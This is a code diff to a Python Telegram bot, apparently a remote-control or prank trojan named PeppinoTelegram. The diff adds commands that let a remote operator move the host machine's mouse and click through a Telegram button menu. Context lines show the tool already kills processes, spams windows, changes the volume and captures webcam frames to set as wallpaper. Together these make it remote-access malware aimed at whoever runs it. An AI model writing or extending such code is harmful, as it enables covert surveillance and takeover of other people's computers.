@@ -61,6 +61,7 @@ islinux = not iswindows
 cwd_folder = getcwd()
 HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
 BURN_DIRECTORY = join(HOME_PATH, ".cache")
+MOUSE_JMP = 50
 
 vfx = abspath(join(cwd_folder, "vfx"))
 sfx = abspath(join(cwd_folder, "sfx"))
@@ -149,6 +150,7 @@ processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
 camerawallpaper - Sets webcam's frames as wallpaper.
 setvideowallpaper - Sets a video as wallpaper.
+mousecontroller - Sends a mouse controlling menu.
 mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
 
@@ -662,6 +664,14 @@ class PeppinoTelegram:
             "setvolume":self.audio_mixer.setVolumePercentage,
             "fullvolume":lambda:self.audio_mixer.full(),
             "camerawallpaper":self.setCameraAsWallpaper,
+            "mousecontroller":self.mousecontroller,
+            "mouser":self.mouser,
+            "mousel":self.mousel,
+            "mouseu":self.mouseu,
+            "moused":self.moused,
+            "leftclick":self.leftclick,
+            "rightclick":self.rightclick,
+            "nothing":lambda:...,
             "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
         }
         self.no_background_functions = [self.message_box, self.spam_windows]
@@ -743,6 +753,35 @@ class PeppinoTelegram:
         self.parse_command(data) 
         self.bot.answerCallbackQuery(query_id)
 
+    def mouseu(self) -> None:
+        pos = pg.position()
+        pg.moveTo(pos[0], pos[1]-MOUSE_JMP)
+
+    def moused(self) -> None:
+        pos = pg.position()
+        pg.moveTo(pos[0], pos[1]+MOUSE_JMP)
+
+    def mouser(self) -> None:
+        pos = pg.position()
+        pg.moveTo(pos[0]+MOUSE_JMP, pos[1])
+
+    def mousel(self) -> None:
+        pos = pg.position()
+        pg.moveTo(pos[0]-MOUSE_JMP, pos[1])
+
+    def leftclick(self) -> None:
+        pg.leftClick()
+    
+    def rightclick(self) -> None:
+        pg.rightClick()
+
+    def mousecontroller(self) -> None:
+        menu = {
+            "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
+            "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
+        }
+        self.mouse_controller_menu = self.new_menu(menu, label="Mouse Control", rows=3)
+
     def process_killer(self, page=0) -> None:
         if self.process_explorer_menu is None:
             self.page = 0
@@ -818,7 +857,6 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
         loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
-
         filename = join(BURN_DIRECTORY, "jxframe.png")
         backup_filename = join(BURN_DIRECTORY, "backup.png")
         start = time()
